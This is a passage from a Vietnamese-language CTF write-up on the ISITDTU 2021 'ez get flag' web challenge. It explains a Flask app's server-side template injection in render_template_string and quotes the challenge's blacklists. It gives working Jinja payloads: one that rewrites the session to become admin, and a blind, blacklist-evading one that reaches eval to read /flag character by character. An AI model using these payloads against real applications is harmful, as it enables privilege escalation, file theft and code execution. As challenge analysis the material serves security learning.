</pre></table></code></div></div><p>Chạy script ta có <code class="language-plaintext highlighter-rouge">SECRET = ISITDTU_CTF_S3cret_!!!</code>, nhập captcha này vào login form chúng ta sẽ vào được <code class="language-plaintext highlighter-rouge">home</code>:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/GSRgHAs.png" alt="" /></p><h3 id="3-privilege-escalation-to-become-admin">3. Privilege escalation to become admin:<a href="#3-privilege-escalation-to-become-admin"><i class="fas fa-hashtag"></i></a></h3></h3><p>Để ý vào dòng “Your secret: …” ở chức năng <code class="language-plaintext highlighter-rouge">home</code>. Nó sẽ trả về những gì chúng ta nhập vào tại field <code class="language-plaintext highlighter-rouge">Secret (option)</code> thông qua template engine của web app là <a href="https://jinja.palletsprojects.com/en/3.0.x/">Jinja</a>. Liệu nó có bị dính SSTI hay không? Câu trả lời là không vì chức năng này đang sử dụng hàm <a href="https://www.fullstackpython.com/flask-templating-render-template-examples.html">render_template</a> để đẩy <strong>dynamic content</strong> từ biến <code class="language-plaintext highlighter-rouge">secret</code> vào một <strong>static template file</strong> là <code class="language-plaintext highlighter-rouge">home.html</code>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c1"># home function
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/home'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
	<span class="k">if</span> <span class="s">'username'</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
		<span class="n">secret</span> <span class="o">=</span> <span class="n">session</span><span class="p">[</span><span class="s">'sr'</span><span class="p">]</span>
		<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'home.html'</span><span class="p">,</span> <span class="n">secret</span><span class="o">=</span><span class="n">secret</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s">'login'</span><span class="p">))</span>
</pre></table></code></div></div><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c">&lt;!-- home.html --&gt;</span>
{% if secret %}
<span class="nt">&lt;i&gt;&lt;h3</span> <span class="na">class=</span><span class="s">"jumbotron-heading"</span><span class="nt">&gt;</span>Your secret: {{secret}}<span class="nt">&lt;/h3&gt;&lt;/i&gt;</span>
{% endif %}
</pre></table></code></div></div><p>Mà theo một <a href="https://portswigger.net/web-security/server-side-template-injection">bài research của PortSwigger về SSTI</a> thì:</p><blockquote><p>Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable to server-side template injection.</p></blockquote><p>Tuy vậy, trong quá trình research các hàm dùng để render content của web app này thì mình phát hiện trong source có một đoạn tác giả không sử dụng hàm render_template, thay vào đó là render_template_string (xem sự khác nhau giữa 2 hàm render này tại <a href="https://www.programmerall.com/article/2281890402/">đây</a>), nằm ở chức năng <code class="language-plaintext highlighter-rouge">rate</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">==</span> <span class="s">'admin'</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="s">'check'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
	<span class="n">picture</span> <span class="o">=</span> <span class="n">picture</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'{{'</span><span class="p">,</span><span class="s">'{'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'}}'</span><span class="p">,</span><span class="s">'}'</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'&gt;'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'#'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">'&lt;'</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">waf</span><span class="p">.</span><span class="n">isValid</span><span class="p">(</span><span class="n">picture</span><span class="p">):</span>
		<span class="n">render_template_string</span><span class="p">(</span><span class="n">picture</span><span class="p">)</span>
	<span class="k">return</span> <span class="s">'you are admin you can choose all :)'</span>

<span class="k">else</span><span class="p">:</span>
	<span class="n">_waf</span> <span class="o">=</span> <span class="p">[</span><span class="s">'{{'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'~'</span><span class="p">,</span><span class="s">'"'</span><span class="p">,</span><span class="s">'_'</span><span class="p">,</span><span class="s">'|'</span><span class="p">,</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span><span class="s">'['</span><span class="p">,</span><span class="s">']'</span><span class="p">,</span><span class="s">'#'</span><span class="p">,</span><span class="s">'&gt;'</span><span class="p">,</span><span class="s">'&lt;'</span><span class="p">,</span><span class="s">'!'</span><span class="p">,</span><span class="s">'config'</span><span class="p">,</span><span class="s">'=='</span><span class="p">,</span><span class="s">'}}'</span><span class="p">]</span>
	<span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">_waf</span><span class="p">:</span>
		<span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">picture</span><span class="p">:</span>
			<span class="n">picture</span> <span class="o">=</span> <span class="n">picture</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">char</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
	<span class="k">if</span> <span class="n">waf</span><span class="p">.</span><span class="n">check_len</span><span class="p">(</span><span class="n">picture</span><span class="p">):</span>
		<span class="n">render_template_string</span><span class="p">(</span><span class="n">picture</span><span class="p">)</span>
	<span class="k">return</span> <span class="s">'you are wonderful ♥'</span>
</pre></table></code></div></div><p>Chức năng <code class="language-plaintext highlighter-rouge">rate</code> ở 2 role <code class="language-plaintext highlighter-rouge">admin</code> và <code class="language-plaintext highlighter-rouge">guest</code> đều hoạt động giống như nhau, đều <code class="language-plaintext highlighter-rouge">render_template_string(picture)</code> ở cuối, nhưng ở role <code class="language-plaintext highlighter-rouge">admin</code> thì biến <code class="language-plaintext highlighter-rouge">picture</code> bị filter nhẹ tay hơn so với ở role <code class="language-plaintext highlighter-rouge">guest</code> (bạn có thể kiếm tra 2 hàm <strong>check_len</strong> và <strong>isValid</strong> trong <a href="https://github.com/antoinenguyen-09/All_CTF_write-ups/blob/master/ISITDTU%20CTF/2021/web/ez%20get%20flag/source/files/lib/waf.py">waf.py</a> là thấy rõ). Do đó hướng đi của mình là privilege escalate lên admin bằng SSTI cho dễ thở. Lí do tại sao truyền thẳng một string vào hàm render_template_string lại có thể gây ra SSTI thì các bạn có thể đọc tại <a href="https://sl1nki.page/blog/2021/01/24/ssti">đây</a>. Mình xin được đi thẳng vào luôn phần bypass và exploit, vì endpoint bị dính SSTI đã hiện ra ngay tại đây rồi:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/BRG26Ii.png" alt="" /></p><p>Vấn đề là chúng ta phải bypass được cái black list <code class="language-plaintext highlighter-rouge">_waf</code>của guest:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">_waf</span> <span class="o">=</span> <span class="p">[</span><span class="s">'{{'</span><span class="p">,</span><span class="s">'+'</span><span class="p">,</span><span class="s">'~'</span><span class="p">,</span><span class="s">'"'</span><span class="p">,</span><span class="s">'_'</span><span class="p">,</span><span class="s">'|'</span><span class="p">,</span><span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span><span class="s">'['</span><span class="p">,</span><span class="s">']'</span><span class="p">,</span><span class="s">'#'</span><span class="p">,</span><span class="s">'&gt;'</span><span class="p">,</span><span class="s">'&lt;'</span><span class="p">,</span><span class="s">'!'</span><span class="p">,</span><span class="s">'config'</span><span class="p">,</span><span class="s">'=='</span><span class="p">,</span><span class="s">'}}'</span><span class="p">]</span>
</pre></table></code></div></div><p>Trước mắt chúng ta thấy “{{…}}”, vốn dùng để biểu diễn một <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#expressions">expression</a> trong Jinja đã bị blacklist. Nhưng chúng ta vẫn có thể dùng “{%…%}” - <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#list-of-control-structures">control statement</a> để làm vài trò hay ho, trong đó có <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#assignments">gán giá trị cho các template variable</a>. Thông thường thì các template variable của jinja ở phía front end sẽ độc lập hoàn toàn với các variable <strong>cùng tên</strong> của python ở phía back end, khi có 2 điều kiện được thỏa mãn là variable cùng tên đó của Python <strong>không được truyền</strong> vào template variable của Jinja thông qua các <strong>hàm render</strong> và trong <strong>control statement</strong> của Jinja <strong>không có một variable cùng tên</strong> được khai báo. Lấy 2 đoạn code kèm output tương ứng của nó như sau làm ví dụ:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c1"># case 1
</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s">'antoine'</span> <span class="c1"># variable "name" in Python
</span>    <span class="n">picture</span> <span class="o">=</span> <span class="s">"""{{name}}"""</span> <span class="c1">#  template variable "name" in Jinja 
</span>    <span class="k">print</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>   <span class="c1"># output: "antoine"
</span>    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">picture</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span> <span class="c1"># variable "name" in Python is passed to template variable "name" in Jinja.
</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/xLr6dnD.png" alt="" /></p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c1"># case 2
</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="n">name</span> <span class="o">=</span> <span class="s">'antoine'</span> <span class="c1"># variable "name" in Python
</span>    <span class="n">picture</span> <span class="o">=</span> <span class="s">"""{%set name='nguyen'%}{{name}}"""</span> <span class="c1">#  template variable "name" in Jinja
</span>    <span class="k">print</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>   <span class="c1"># output: "antoine"
</span>    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">picture</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span> <span class="c1"># variable "name" in Python is passed to template variable "name" in Jinja. However, there is a variable "name" initialized and assigned with "nguyen" in control statement of Jinja, so the template displayed as following.
</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/PI8J2IR.png" alt="" /></p><p>Trường hợp tương tự cũng xảy ra với các instance được tạo từ các subclass của module Flask như <a href="https://flask.palletsprojects.com/en/2.0.x/quickstart/#sessions">session</a>.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c1"># session saved in server side.
</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">session</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET_KEY'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'antoine'</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
    <span class="n">session</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span> <span class="o">=</span> <span class="s">'guest'</span>
    <span class="n">session</span><span class="p">[</span><span class="s">'check'</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">picture</span> <span class="o">=</span> <span class="s">"""{%set a=session.update({'username':'admin','check':1})%}"""</span>
    <span class="k">print</span><span class="p">(</span><span class="n">session</span><span class="p">)</span> <span class="c1"># output: {'check': 0, 'username': 'guest'}
</span>    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">picture</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/K8oBdlf.png" alt="" /></p><p>Theo lời chú thích ở ảnh thì chúng ta hoàn toàn có thể gửi cookie đã bị thay đổi và privilege escalate lên admin bằng payload sau:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{%set a=session.update({'username':'admin','check':1})%}
</pre></table></code></div></div><p>Submit rồi refresh lại trang, chúng ta sẽ thấy dòng này thay vì “you are wonderful ♥”:</p><p><img data-proofer-ignore data-src="https://i.imgur.com/WRu213a.png" alt="" /></p><h3 id="4-exploit-blind-ssti-by-triggering-error-and-get-the-flag">4. Exploit Blind SSTI by triggering error and get the flag<a href="#4-exploit-blind-ssti-by-triggering-error-and-get-the-flag"><i class="fas fa-hashtag"></i></a></h3></h3><p>Như vậy công việc cuối cùng của chúng ta là tìm cách đọc được file <code class="language-plaintext highlighter-rouge">flag</code>. Tuy nhiên, lại xuất hiện thêm một khó khăn nữa, đó là những gì xuất hiện trên response sẽ được Flask trả về dựa trên kết quả của câu lệnh <code class="language-plaintext highlighter-rouge">return</code>. Mà thứ chúng ta cần là <code class="language-plaintext highlighter-rouge">render_template_string(picture)</code> thì nó lại không được <code class="language-plaintext highlighter-rouge">return</code>. Do đó chúng ta không thể một phát đọc luôn nội dung của flag.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">if</span> <span class="n">waf</span><span class="p">.</span><span class="n">isValid</span><span class="p">(</span><span class="n">picture</span><span class="p">):</span>
	<span class="n">render_template_string</span><span class="p">(</span><span class="n">picture</span><span class="p">)</span>  <span class="c1"># this won't never be appear in response :(
</span><span class="k">return</span> <span class="s">'you are admin you can choose all :)'</span> <span class="c1"># this will always appear in response!
</span></pre></table></code></div></div><p>Đã từng thấy Blind SQL Injection, Blind Command Injection,… nhưng đây là lần đầu tiên mình thấy Blind SSTI =)))). Về cơ bản thì hầu hết các vuln Blind Injection đều có các case khai thác phổ biến như trigger time delays, errors, out-of-band,… Mình quyết định khai thác case Blind SSTI bằng cách trigger errors, vì nó dễ viết code khai thác:v:</p><p>Trước hết, mọi ý tưởng về khai thác SSTI đều hướng tới mục đích cuối cùng là bypass python sandbox (python jail), từ “không có gì” cho đến gọi được các hàm “nguy hiểm” dùng để đọc file, chạy command, đồng nghĩa với RCE thành công (các bạn có thể xem một bài viết của tôi về <a href="https://ethical-h4ckers-club.blogspot.com/2020/11/fpt-uni-secathon-3-misc-writeup-prp301.html">escape python jail</a>). Python sandbox ở đây mà chúng ta cần bypass ở đây chính là Jinja, vì mặc dù Jinja có syntax khá giống Python, cho phép nhúng code Python vào nhưng bản chất nó không phải là Python. Bạn sẽ hiểu điều này khi nghiên cứu về <a href="https://jinja.palletsprojects.com/en/3.0.x/api">Jinja API</a>. Về cơ bản thì API của Jinja được chia thành <strong>High Level API</strong> và <strong>Low Level API</strong>, và các API này đều có thể gọi được trong Python bằng cách <code class="language-plaintext highlighter-rouge">from jinja2 import &lt;module's name&gt;</code>:</p><blockquote><p>The high-level API is the API you will use in the application to load and render Jinja templates. The Low Level API on the other side is only useful if you want to dig deeper into Jinja or develop extensions.</p></blockquote><p>Trong high-level API có một class rất đặc biệt là <code class="language-plaintext highlighter-rouge">jinja2.Undefined</code>:</p><blockquote><p>These classes can be used as undefined types. The Environment constructor takes an undefined parameter that can be one of those classes or a custom subclass of Undefined. Whenever the template engine is unable to look up a name or access an attribute one of those objects is created and returned. Some operations on undefined values are then allowed, others fail.</p></blockquote><p>Ví dụ về một instance của class <code class="language-plaintext highlighter-rouge">jinja2.Undefined</code>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">jinja2</span> <span class="kn">import</span> <span class="n">Template</span>

<span class="n">msg</span> <span class="o">=</span> <span class="n">Template</span><span class="p">(</span><span class="s">"{{ module.type(t) }}"</span><span class="p">).</span><span class="n">render</span><span class="p">(</span><span class="n">module</span><span class="o">=</span><span class="n">__builtins__</span><span class="p">)</span>  <span class="c1"># variable "t" in template wasn't initialize and Jinja engine is unable to look up íts name, so Jinja treat it as undefined class.
</span><span class="k">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span> <span class="c1"># output: &lt;class 'jinja2.runtime.Undefined'&gt;
</span></pre></table></code></div></div><p>Mà theo mình nhớ trong Python thì tất cả mọi class đều có 1 magic method là <a href="https://www.geeksforgeeks.org/__init__-in-python/"><code class="language-plaintext highlighter-rouge">__init__</code></a> (giống như mọi class của Java đều phải có constructor vậy). Và class <code class="language-plaintext highlighter-rouge">jinja2.Undefined</code> cũng không phải ngoại lệ (các bạn có thể xem danh sách các method của class này tại <a href="http://code.nabla.net/doc/jinja2/api/jinja2/runtime/jinja2.runtime.Undefined.html#jinja2.runtime.Undefined">đây</a>). Gọi được method <code class="language-plaintext highlighter-rouge">__init__</code> là đồng nghĩa với trở về dạng SSTI quen thuộc thường thấy trên <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-ospopenread">cheat sheet</a>:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;object&gt;</span>.__init__.__globals__.__builtins__.<span class="nt">&lt;a</span> <span class="na">builtins</span> <span class="na">method</span> <span class="na">in</span> <span class="na">Python</span><span class="nt">&gt;</span>
</pre></table></code></div></div><p>Bạn có thể đọc doc để hiểu rõ hơn về <a href="https://docs.python.org/3/library/stdtypes.html?highlight=subclasses#built-in-types"><code class="language-plaintext highlighter-rouge">__builtins__</code></a> và mình xin trích dẫn lại định nghĩa ngắn gọn về <code class="language-plaintext highlighter-rouge">__globals__</code> từ <a href="https://docs.python.org/3/reference/datamodel.html">đây</a>:</p><blockquote><p>A reference to the dictionary that holds the function’s global variables — the global namespace of the module in which the function was defined.</p></blockquote><p>Nhưng vì cảm thấy game vẫn chưa đủ khó, tác giả đã blacklist luôn cả 2 <code class="language-plaintext highlighter-rouge">__globals__</code> và <code class="language-plaintext highlighter-rouge">__builtins__</code> :D</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">BLACK_LIST</span> <span class="o">=</span> <span class="p">[</span>
 <span class="s">'class'</span><span class="p">,</span> <span class="s">'mro'</span><span class="p">,</span> <span class="s">'base'</span><span class="p">,</span> <span class="s">'request'</span><span class="p">,</span> <span class="s">'app'</span><span class="p">,</span>
 <span class="s">'sleep'</span><span class="p">,</span> <span class="s">'add'</span><span class="p">,</span> <span class="s">'+'</span><span class="p">,</span> <span class="s">'config'</span><span class="p">,</span> <span class="s">'subclasses'</span><span class="p">,</span> <span class="s">'format'</span><span class="p">,</span> <span class="s">'dict'</span><span class="p">,</span> <span class="s">'get'</span><span class="p">,</span> <span class="s">'attr'</span><span class="p">,</span> <span class="s">'globals'</span><span class="p">,</span> <span class="s">'time'</span><span class="p">,</span> <span class="s">'read'</span><span class="p">,</span>
 <span class="s">'import'</span><span class="p">,</span> <span class="s">'sys'</span><span class="p">,</span> <span class="s">'cookies'</span><span class="p">,</span> <span class="s">'headers'</span><span class="p">,</span> <span class="s">'doc'</span><span class="p">,</span> <span class="s">'url'</span><span class="p">,</span> <span class="s">'encode'</span><span class="p">,</span> <span class="s">'decode'</span><span class="p">,</span> <span class="s">'chr'</span><span class="p">,</span> <span class="s">'ord'</span><span class="p">,</span> <span class="s">'replace'</span><span class="p">,</span> <span class="s">'echo'</span><span class="p">,</span>
 <span class="s">'pop'</span><span class="p">,</span> <span class="s">'builtins'</span><span class="p">,</span> <span class="s">'self'</span><span class="p">,</span> <span class="s">'template'</span><span class="p">,</span> <span class="s">'print'</span><span class="p">,</span> <span class="s">'exec'</span><span class="p">,</span> <span class="s">'response'</span><span class="p">,</span> <span class="s">'join'</span><span class="p">,</span> <span class="s">'{}'</span><span class="p">,</span> <span class="s">'%s'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">,</span> <span class="s">'#'</span><span class="p">,</span> <span class="s">'&amp;'</span><span class="p">]</span>
</pre></table></code></div></div><p>Nếu đọc cái <code class="language-plaintext highlighter-rouge">BLACK_LIST</code> này xong mà ta vẫn đâm đầu vào cheat sheat để kiếm một payload mới thì chắc là “No Hope!”. Mình chợt nhớ ra trong Jinja có một “magic” cho phép thay đổi các template variable là <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#filters">Filters</a>, và trong số các “Filter” có <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#jinja-filters.reverse">reverse</a> cho phép đảo ngược mọi thứ!</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">home</span><span class="p">():</span>
	<span class="n">picture</span> <span class="o">=</span> <span class="s">"""{{ 'abc'|reverse }}"""</span>
	<span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">picture</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/z2SZe3n.png" alt="" /></p><p>Do đó trong payload chúng ta chỉ cần tạo 2 template variable như này là bypass được <code class="language-plaintext highlighter-rouge">BLACK_LIST</code>. Sau đó tham khảo thêm cheat sheat ta gọi được hàm <a href="https://www.w3schools.com/python/ref_func_eval.asp">eval</a> để bắt đầu chạy script :</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">g</span><span class="o">=</span><span class="s">'__slabolg__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="s">'__snitliub__'</span><span class="o">|</span><span class="n">reverse</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">p</span><span class="o">=</span><span class="n">t</span><span class="p">.</span><span class="n">__init__</span><span class="p">[</span><span class="n">g</span><span class="p">][</span><span class="n">b</span><span class="p">][</span><span class="s">'eval'</span><span class="p">]</span><span class="o">%</span><span class="p">}{{</span><span class="n">p</span><span class="p">(</span><span class="s">' s if str([i for i in open("/flag")])[s]=="char" else a'</span><span class="p">,{</span><span class="s">'s'</span><span class="p">:</span><span class="s">"index"</span><span class="o">|</span><span class="n">length</span><span class="p">})}}</span>
</pre></table></code></div></div><p>Nói qua một chút về ý tưởng sử dụng <code class="language-plaintext highlighter-rouge">{{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}}</code>. <code class="language-plaintext highlighter-rouge">p</code> đã được gán bằng method <code class="language-plaintext highlighter-rouge">eval</code>. Expression bên trong eval là:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">s</span> <span class="k">if</span> <span class="nb">str</span><span class="p">([</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">)])[</span><span class="n">s</span><span class="p">]</span><span class="o">==</span><span class="s">"char"</span> <span class="k">else</span> <span class="n">a</span>
